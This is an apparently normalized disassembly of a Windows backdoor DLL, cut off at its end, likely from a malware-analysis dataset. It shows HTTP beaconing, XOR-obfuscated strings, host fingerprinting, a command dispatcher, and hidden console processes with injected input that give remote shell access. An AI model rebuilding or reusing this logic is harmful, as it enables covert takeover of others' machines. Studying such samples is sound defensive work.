sub_10001020
mov edx [ esp + 0x4 ]
push esi
mov esi ecx
xor eax eax
mov ecx [ esp + 0x1c ]
push edx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov eax [ esp + 0x1c ]
mov [ esi + 0x10 ] ecx
mov ecx esi
mov [ esi ] r--data
mov [ esi + 0x24 ] eax
call sub_10001200
mov eax [ esp + 0x10 ]
mov ecx esi
push eax
call sub_10001270
mov ecx [ esp + 0xc ]
push ecx
mov ecx esi
call sub_10001300
mov edx [ esp + 0x14 ]
mov ecx esi
push edx
call sub_10001370
mov eax esi
pop esi
retn 0x18
sub_10001090
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001510
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov esi [ esi + 0x20 ]
test esi esi
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop esi
retn
push esi
call ??3@YAXPAX@Z
add esp 0x4
sub_100010e0
push ecx
push ebx
push esi
push edi
mov esi ecx
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push 0x0
push 0x0
push eax
call [ InternetOpenA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x10 ]
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
mov ebx [ esp + 0xc ]
mov ebx [ InternetSetOptionA@IAT ]
push 0x4
push edi
push 0x5
push eax
call ebx
mov ecx [ esi + 0x4 ]
push 0x4
push edi
push 0x2
push ecx
call ebx
mov edx [ esi + 0x4 ]
push 0x4
push edi
push 0x6
push edx
call ebx
mov ebx eax
jmp r-xdata
mov edi 0x84000100
mov eax 0x50
mov edi 0x84803100
mov eax 0x1bb
jmp r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ecx
retn
mov ecx [ esi + 0x4 ]
push 0x0
push 0x0
push 0x3
push rw-data
push rw-data
push eax
mov eax [ esi + 0x18 ]
push eax
push ecx
call [ InternetConnectA@IAT ]
test eax eax
mov [ esi + 0x8 ] eax
jne r-xdata
mov dl [ eax + rw-data ]
xor dl 0xbb
shr dl 0x1
mov [ esp + eax + 0xc ] dl
inc eax
cmp eax 0x3
jl r-xdata
push 0x0
push edi
mov [ rw-data ] eax
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x8 ]
push 0x0
push rw-data
push 0x0
lea ecx [ esp + 0x20 ]
push eax
push ecx
push edx
mov [ esp + 0x2f ] 0x0
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ esi + 0xc ] edx
jne r-xdata
mov esi [ esi + 0x20 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn
pop edi
mov eax ebx
pop esi
pop ebx
pop ecx
retn
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
push 0x20000000
push 0xffffffff
push esi
push edx
call [ HttpAddRequestHeadersA@IAT ]
mov ebx eax
sub_10001200
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x18 ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x18 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_10001270
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push ebp
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ ebx + 0x14 ]
not ecx
dec ecx
test eax eax
mov ebp ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
lea eax [ ebp + 0x2 ]
push eax
call ??2@YAPAXI@Z
mov edx eax
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ ebx + 0x14 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x14 ]
lea eax [ ecx + ebp ]
mov cl [ ecx + ebp - 0x1 ]
cmp cl 0x2f
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
pop edi
pop ebp
pop esi
mov eax 0x1
pop ebx
retn 0x4
mov [ eax ] 0x2f
mov edx [ ebx + 0x14 ]
mov [ edx + ebp + 0x1 ] 0x0
sub_10001300
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x1c ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x1c ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_10001370
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
jne r-xdata
push edi
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
mov eax [ esi + 0x20 ]
not ecx
dec ecx
test eax eax
mov edi ecx
je r-xdata
pop esi
xor eax eax
pop ebx
retn 0x4
inc edi
push edi
call ??2@YAPAXI@Z
mov edx eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x4
mov [ esi + 0x20 ] edx
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax 0x1
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
retn 0x4
push eax
call ??3@YAXPAX@Z
add esp 0x4
sub_100013e0
sub esp 0x58
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push ebx
mov ebx [ esp + 0x64 ]
push ebp
mov ebp [ esp + 0x6c ]
push edi
xor eax eax
pop esi
add esp 0x58
retn 0x8
mov cl [ eax + rw-data ]
xor cl 0xb1
shr cl 0x1
mov [ esp + eax + 0x10 ] cl
inc eax
cmp eax 0x14
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x10 ]
push ebp
lea eax [ esp + 0x2c ]
push edx
push eax
mov [ esp + 0x30 ] 0x0
call sprintf
mov edx [ esi + 0xc ]
add esp 0xc
lea ecx [ esp + 0x28 ]
push 0xa0000000
push 0xffffffff
push ecx
push edx
call [ HttpAddRequestHeadersA@IAT ]
mov eax [ esi + 0xc ]
push ebp
push ebx
push 0x0
push 0x0
push eax
call [ HttpSendRequestA@IAT ]
mov edi eax
test edi edi
jne r-xdata
mov eax edi
pop edi
pop ebp
pop ebx
pop esi
add esp 0x58
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2f0d
jne r-xdata
mov eax [ esi + 0xc ]
lea ecx [ esp + 0x6c ]
lea edx [ esp + 0x70 ]
push ecx
push edx
push 0x1f
push eax
mov [ esp + 0x7c ] 0x4
call [ InternetQueryOptionA@IAT ]
mov ecx [ esp + 0x70 ]
mov edx [ esi + 0xc ]
or ch 0x1
push 0x4
mov [ esp + 0x74 ] ecx
lea ecx [ esp + 0x74 ]
push ecx
push 0x1f
push edx
call [ InternetSetOptionA@IAT ]
test eax eax
jne r-xdata
xor eax eax
sub_100014e0
mov edx [ esp + 0x4 ]
push esi
test edx edx
mov esi ecx
jne r-xdata
push edi
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
mov ecx esi
call sub_100013e0
pop edi
pop esi
retn 0x4
xor eax eax
pop esi
retn 0x4
sub_10001510
push esi
mov esi ecx
push edi
mov edi [ InternetCloseHandle@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x8 ] 0x0
pop edi
mov eax 0x1
pop esi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_10001590
push esi
xor ecx ecx
xor esi esi
xor edx edx
shr al 0x1
mov [ edx + ecx + rw-data ] al
inc ecx
mov [ edx + ecx + rw-data ] 0x0
add edx 0x8
xor ecx ecx
jmp r-xdata
mov al [ esi + rw-data ]
cmp al 0x40
jne r-xdata
pop esi
retn
inc esi
cmp esi 0x25
jl r-xdata
sub_100015d0
push 0xffffffff
push sub_100045db
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x23c
push ebx
push ebp
xor ebp ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x24 ] ebp
call sub_10001590
push 0x400
mov [ rw-data ] ebp
call ??2@YAPAXI@Z
add esp 0x4
cmp eax ebp
mov [ esp + 0x1c ] eax
je r-xdata
mov ecx [ esp + 0x244 ]
pop ebp
xor eax eax
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x248
retn
mov ecx [ esp + 0x254 ]
mov [ rw-data ] ebp
cmp ecx ebp
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
mov ebx [ esp + 0x258 ]
cmp ebx ebp
je r-xdata
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xc3
shr cl 0x1
mov [ esp + eax + 0xa8 ] cl
inc eax
cmp eax 0x15
jl r-xdata
push esi
push edi
mov [ rw-data ] eax
lea edi [ esp + 0xb0 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0xc5 ] 0x0
mov edx [ esp + 0x24 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
mov [ esp + 0x9c ] 0x10
[ edi ]
not ecx
dec ecx
add ecx edx
lea edx [ esp + 0x9c ]
push edx
push ecx
mov [ esp + 0x24 ] ecx
call [ GetComputerNameA@IAT ]
mov eax [ esp + 0x268 ]
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x264 ]
push 0x36ee80
push eax
mov eax [ esp + 0x264 ]
push ecx
push edx
push ebx
push eax
lea ecx [ esp + 0x80 ]
call sub_10001020
mov esi [ Sleep@IAT ]
mov [ esp + 0x254 ] 0x0
cmp ebp 0x5
jae r-xdata
lea ecx [ esp + 0x68 ]
inc ebp
call sub_10001510
push 0x7530
call esi
cmp ebp 0x5
jb r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x10000
call ??2@YAPAXI@Z
mov ebx eax
push 0x2000
mov [ esp + 0x18 ] ebx
call ??2@YAPAXI@Z
mov esi eax
push 0x1000
mov [ esp + 0x2c ] esi
call ??2@YAPAXI@Z
add esp 0xc
mov [ esp + 0x30 ] eax
test ebx ebx
je r-xdata
lea ecx [ esp + 0x68 ]
call sub_100010e0
test eax eax
jne r-xdata
jmp r-xdata
lea ecx [ esp + 0x68 ]
call sub_10001510
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push ecx
call [ TerminateProcess@IAT ]
mov edx [ rw-data ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
test esi esi
je r-xdata
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
push eax
call ??3@YAXPAX@Z
mov eax [ esp + 0x34 ]
add esp 0x4
test eax eax
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
xor ecx ecx
lea edx [ esp + 0x5c ]
mov [ esp + 0x5c ] ecx
lea eax [ esp + 0x54 ]
mov [ esp + 0x60 ] ecx
mov [ esp + 0x5c ] 0xc
mov [ esp + 0x64 ] ecx
mov [ esp + 0x60 ] ecx
push ecx
push edx
lea ecx [ esp + 0x60 ]
push eax
push ecx
mov [ esp + 0x74 ] 0x1
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ rw-data ]
push edx
call esi
mov eax [ esp + 0x58 ]
cmp eax 0xffffffff
je r-xdata
push eax
call ??3@YAXPAX@Z
add esp 0x4
lea edx [ esp + 0x144 ]
push 0x104
push edx
call [ GetWindowsDirectoryA@IAT ]
xor eax eax
mov eax [ esp + 0x54 ]
cmp eax 0xffffffff
je r-xdata
push eax
call esi
mov cl [ eax + rw-data ]
xor cl 0xc
shr cl 0x1
mov [ esp + eax + 0x90 ] cl
inc eax
cmp eax 0x6
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x90 ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x96 ] 0x0
lea edx [ esp + 0x144 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x144 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ SetCurrentDirectoryA@IAT ]
xor eax eax
lea ecx [ esp + 0x68 ]
mov [ esp + 0x254 ] 0xffffffff
call sub_10001090
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x23c ]
mov [ fs : 0x0 ] ecx
add esp 0x248
retn
push eax
call esi
mov cl [ eax + rw-data ]
xor cl 0x44
shr cl 0x1
mov [ esp + eax + 0x104 ] cl
inc eax
cmp eax 0xf
jl r-xdata
mov edx [ esp + 0x1c ]
mov [ rw-data ] eax
lea eax [ esp + 0x104 ]
push edx
push eax
push ebx
mov [ esp + 0x11f ] 0x0
call sprintf
add esp 0xc
mov edi ebx
mov eax [ esp + 0x2c ]
test eax eax
jne r-xdata
test esi esi
jne r-xdata
push esi
push ebx
lea ecx [ esp + 0x70 ]
call sub_100013e0
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x58 ]
push ecx
push ebx
push edx
call sub_100022a0
add esp 0xc
mov esi eax
cmp ebp 0x5
ja r-xdata
push 0x7530
inc ebp
call [ Sleep@IAT ]
cmp ebp 0x5
ja r-xdata
test esi esi
jne r-xdata
mov ebx [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
lea ecx [ esp + 0x14 ]
xor esi esi
push ecx
push 0x2000
push edi
lea ecx [ esp + 0x74 ]
mov [ ebx ] 0x0
call sub_100014c0
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
mov al [ rw-data ]
lea edi [ esp + 0x1a ]
xor al 0xbd
or ecx 0xffffffff
shr al 0x1
mov [ esp + 0x1a ] al
xor eax eax
mov [ esp + 0x1b ] 0x0
mov edx 0x1
[ edi ]
not ecx
sub edi ecx
mov [ rw-data ] edx
mov eax ecx
mov esi edi
mov edi ebx
mov [ esp + 0x2c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
mov eax [ rw-data ]
xor ebp ebp
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
add esi eax
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax 0x2000
lea edx [ esp + 0x14 ]
sub eax esi
push edx
lea ecx [ esi + edi ]
push eax
push ecx
lea ecx [ esp + 0x74 ]
call sub_100014c0
test eax eax
jne r-xdata
lea edx [ esp + 0x68 ]
mov [ esi + edi ] 0x0
push edx
call sub_100039c0
add esp 0x4
test eax eax
je r-xdata
mov ebx [ esp + 0x20 ]
mov eax 0x1
mov [ rw-data ] eax
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x28 ] eax
mov eax [ rw-data ]
test eax eax
je r-xdata
xor edi edi
push 0x20
push edi
push ebp
call sub_10002110
add esp 0xc
mov esi rw-data
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp edi 0x6
ja r-xdata
add esi 0x8
inc edi
cmp esi rw-data
jl r-xdata
push ebx
mov ebp ebx
call sub_100020c0
mov ebx eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi [ esp + 0x30 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
cmp [ ebp ] 0x0
je r-xdata
mov edi [ esp + 0x10 ]
jmp r-xdata
mov ebp [ esp + 0x30 ]
cmp [ ebp ] 0x3
jne r-xdata
jmp [ edi * 4 + jump_table_10001f8c ]
mov ecx [ rw-data ]
push ecx
push esi
call _strcmpi
add esp 0x8
test eax eax
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
mov ebx [ esp + 0x10 ]
not ecx
dec ecx
mov esi ecx
xor eax eax
mov eax [ rw-data ]
push eax
push 0x1
call [ GenerateConsoleCtrlEvent@IAT ]
jmp r-xdata
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_100023f0
add esp 0x8
jmp r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x68 ]
push ecx
push edx
call sub_10002620
add esp 0x8
jmp r-xdata
mov ecx [ esp + 0x10 ]
lea eax [ esp + 0x68 ]
push eax
push ecx
call sub_10002d90
add esp 0x8
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x25c ]
push 0x0
push 0x0
push eax
push sub_10003120
push 0x0
push 0x0
mov [ rw-data ] edx
call [ CreateThread@IAT ]
mov esi eax
push 0xffffffff
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
jmp r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ esp + 0x68 ]
push ecx
push edx
call sub_10003680
add esp 0x8
jmp r-xdata
mov ebp [ GetLocalTime@IAT ]
mov ebx [ esp + 0x10 ]
mov edi [ esp + 0x20 ]
mov cl [ eax + rw-data ]
xor cl 0x6
shr cl 0x1
mov [ esp + eax + 0x1c ] cl
inc eax
cmp eax 0x2
jl r-xdata
mov [ rw-data ] eax
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
mov [ esp + 0x1e ] 0x0
push ebp
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_10001fb0
add esp 0x4
mov [ esp + 0x28 ] 0x1
mov cl [ eax + rw-data ]
xor cl 0x62
shr cl 0x1
mov [ esp + eax + 0x114 ] cl
inc eax
cmp eax 0x2e
jl r-xdata
mov edx [ esp + 0xaa ]
mov ecx [ esp + 0xa6 ]
mov [ rw-data ] eax
mov eax [ esp + 0xa8 ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0xa6 ]
and ecx 0xffff
push eax
and edx 0xffff
push ecx
lea eax [ esp + 0x120 ]
push edx
push eax
push ebx
mov [ esp + 0x15a ] 0x0
call sprintf
add esp 0x18
lea ecx [ esp + 0x68 ]
push ebx
call sub_100014e0
push rw-data
lea ecx [ esp + 0x6c ]
call sub_100014e0
lea ecx [ esp + 0x14 ]
push ecx
push 0x2000
push edi
lea ecx [ esp + 0x74 ]
call sub_100014c0
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax + edi ] 0x0
mov [ esp + 0x44 ] edx
xor eax eax
mov [ esp + 0x48 ] edx
mov [ esp + 0x4c ] edx
mov [ esp + 0x50 ] edx
mov cl [ eax + rw-data ]
xor cl 0x85
shr cl 0x1
mov [ esp + eax + 0xe4 ] cl
inc eax
cmp eax 0xd
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0x4e ]
lea eax [ esp + 0x4c ]
push edx
lea ecx [ esp + 0x4e ]
push eax
lea edx [ esp + 0x4e ]
push ecx
lea eax [ esp + 0xf0 ]
push edx
push eax
push edi
mov [ esp + 0x109 ] 0x0
call sscanf
mov cx [ esp + 0xb8 ]
lea edx [ esp + 0x5c ]
push edx
mov [ esp + 0x60 ] cx
call sub_10003a30
add esp 0x1c
test eax eax
jne r-xdata
xor eax eax
mov cl [ eax + rw-data ]
xor cl 0xb9
shr cl 0x1
mov [ esp + eax + 0x90 ] cl
inc eax
cmp eax 0xb
jl r-xdata
mov cl [ eax + rw-data ]
xor cl 0x52
shr cl 0x1
mov [ esp + eax + 0xd4 ] cl
inc eax
cmp eax 0xc
jl r-xdata
lea edx [ esp + 0xd4 ]
lea ecx [ esp + 0x68 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0xe4 ] 0x0
call sub_100014e0
lea edx [ esp + 0x90 ]
lea ecx [ esp + 0x68 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0x9f ] 0x0
call sub_100014e0
jmp r-xdata
push rw-data
lea ecx [ esp + 0x6c ]
call sub_100014e0
lea eax [ esp + 0x14 ]
lea ecx [ esp + 0x68 ]
push eax
push 0x2000
push edi
call sub_100014c0
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
xor ecx ecx
mov [ eax + edi ] 0x0
mov [ esp + 0x34 ] ecx
xor eax eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] ecx
lea eax [ esp + 0xa0 ]
push eax
call ebp
xor eax eax
mov dl [ eax + rw-data ]
xor dl 0x22
shr dl 0x1
mov [ esp + eax + 0xf4 ] dl
inc eax
cmp eax 0xd
jl r-xdata
mov [ rw-data ] eax
lea eax [ esp + 0x3e ]
lea ecx [ esp + 0x3c ]
push eax
lea edx [ esp + 0x3e ]
push ecx
lea eax [ esp + 0x3e ]
push edx
lea ecx [ esp + 0x100 ]
push eax
push ecx
push edi
mov [ esp + 0x119 ] 0x0
call sscanf
mov dx [ esp + 0xb8 ]
lea eax [ esp + 0x4c ]
push eax
mov [ esp + 0x50 ] dx
call sub_10003a30
add esp 0x1c
test eax eax
jne r-xdata
mov si [ esp + 0x46 ]
cmp si [ esp + 0x36 ]
jne r-xdata
mov cl [ eax + rw-data ]
xor cl 0x7c
shr cl 0x1
mov [ esp + eax + 0xc8 ] cl
inc eax
cmp eax 0xb
jl r-xdata
xor eax eax
mov dx [ esp + 0x4a ]
cmp dx [ esp + 0x3a ]
jne r-xdata
lea edx [ esp + 0xc8 ]
lea ecx [ esp + 0x68 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0xd7 ] 0x0
call sub_100014e0
jmp r-xdata
mov cl [ eax + rw-data ]
xor cl 0xaf
shr cl 0x1
mov [ esp + eax + 0xb0 ] cl
inc eax
cmp eax 0xc
jl r-xdata
lea edx [ esp + 0xb0 ]
lea ecx [ esp + 0x68 ]
push edx
mov [ rw-data ] eax
mov [ esp + 0xc0 ] 0x0
call sub_100014e0
jmp r-xdata
mov cx [ esp + 0x4c ]
cmp cx [ esp + 0x3c ]
jne r-xdata
mov ax [ esp + 0x4e ]
cmp ax [ esp + 0x3e ]
je r-xdata
mov [ rw-data ] ax
lea eax [ esp + 0x68 ]
push eax
mov [ rw-data ] si
mov [ rw-data ] dx
mov [ rw-data ] cx
push ebx
mov [ ebx ] 0x0
call sub_10003520
add esp 0x8
sub_10001fb0
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x1c ]
xor ebx ebx
cmp ebp ebx
push edi
je r-xdata
pop edi
pop ebp
pop ebx
add esp 0x10
retn
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov cl [ eax + rw-data ]
xor cl 0xc7
shr cl 0x1
mov [ esp + eax + 0x14 ] cl
inc eax
cmp eax 0x6
jl r-xdata
push esi
push ebx
push ebx
push 0x3
push ebx
push 0x3
lea edx [ esp + 0x2c ]
push 0xc0000000
push edx
mov [ rw-data ] eax
mov [ esp + 0x3a ] bl
call [ CreateFileA@IAT ]
mov [ esp + 0x14 ] eax
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x10 ] ebx
mov esi ecx
lea edi [ esi + esi * 4 ]
shl edi 0x2
push edi
call ??2@YAPAXI@Z
mov edx eax
mov ecx edi
mov [ esp + 0x28 ] edx
mov edi edx
mov edx ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx edx
add esp 0x4
and ecx 0x3
[ edi ]
xor ecx ecx
cmp esi ebx
jbe r-xdata
mov edi [ esp + 0x24 ]
lea ecx [ esp + 0x10 ]
push ecx
push esi
mov esi [ esp + 0x1c ]
push edi
push esi
call [ WriteConsoleInputA@IAT ]
push edi
call ??3@YAXPAX@Z
add esp 0x4
push esi
call [ CloseHandle@IAT ]
pop esi
mov eax [ esp + 0x24 ]
mov edx 0x1
add eax 0x8
mov [ eax - 0x8 ] dx
mov [ eax - 0x4 ] edx
mov [ eax ] dx
mov [ eax + 0x2 ] bx
mov [ eax + 0x4 ] bx
add eax 0x14
movsx di [ ecx + ebp ]
mov [ eax - 0xe ] di
mov [ eax - 0xc ] ebx
inc ecx
cmp ecx esi
jb r-xdata
sub_100020c0
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
mov edi esi
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
dec ecx
pop edi
je r-xdata
xor eax eax
pop esi
retn
cmp [ edx + esi ] 0xd
jne r-xdata
mov al [ edx + esi ]
test al al
je r-xdata
lea eax [ edx + esi ]
pop esi
retn
mov [ edx + esi ] 0x0
add edx 0x2
cmp al 0xd
je r-xdata
cmp al 0xa
je r-xdata
inc edx
cmp edx ecx
jb r-xdata
sub_10002110
push ecx
mov eax [ esp + 0xc ]
push ebx
push ebp
xor ebp ebp
push esi
cmp eax ebp
push edi
mov [ esp + 0x10 ] ebp
je r-xdata
mov edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
inc eax
pop ebx
pop ecx
retn
mov esi rw-data
mov bl [ esp + 0x20 ]
mov ecx 0x8
xor eax eax
mov edi rw-data
[ edi ]
mov eax [ esp + 0x1c ]
xor edi edi
cmp eax ebp
mov cl bl
jbe r-xdata
mov dl [ eax ]
cmp dl cl
je r-xdata
test ebp ebp
jne r-xdata
test ebp ebp
je r-xdata
cmp dl 0xd
jne r-xdata
cmp dl 0x22
mov ebp 0x1
jne r-xdata
mov eax [ esp + 0x1c ]
inc edi
cmp edi eax
jb r-xdata
mov edx [ esp + 0x10 ]
xor ebp ebp
add esi 0x4
inc edx
cmp esi rw-data
mov [ eax ] 0x0
mov [ esp + 0x10 ] edx
mov cl bl
je r-xdata
mov edx [ esp + 0x18 ]
lea eax [ edi + edx ]
mov [ esi ] eax
mov cl dl
inc edi
mov eax [ esp + 0x18 ]
add eax edi
mov dl [ eax ]
cmp dl cl
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x8
pop ebx
pop ecx
retn
sub_100021d0
sub esp 0x60
lea eax [ esp ]
push eax
call [ GetConsoleDisplayMode@IAT ]
test eax eax
jne r-xdata
mov eax 0x1
add esp 0x60
retn
push edi
mov ecx 0x11
lea edi [ esp + 0x20 ]
[ edi ]
mov [ esp + 0x20 ] 0x44
mov [ esp + 0x4c ] 0x1
mov [ esp + 0x50 ] ax
pop edi
mov cl [ eax + rw-data ]
xor cl 0x10
shr cl 0x1
mov [ esp + eax + 0x4 ] cl
inc eax
cmp eax 0x7
jl r-xdata
mov [ rw-data ] eax
lea edx [ esp + 0xc ]
lea eax [ esp + 0x1c ]
push edx
push eax
push 0x0
push 0x0
push 0x0
push 0x1
push 0x0
lea ecx [ esp + 0x20 ]
push 0x0
push ecx
push 0x0
mov [ esp + 0x33 ] 0x0
call [ CreateProcessA@IAT ]
test eax eax
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov edx [ esp + 0x14 ]
push edx
call [ AttachConsole@IAT ]
test eax eax
jne r-xdata
add esp 0x60
retn
mov eax [ esp + 0xc ]
push esi
push 0x0
push eax
call [ TerminateProcess@IAT ]
mov ecx [ esp + 0x10 ]
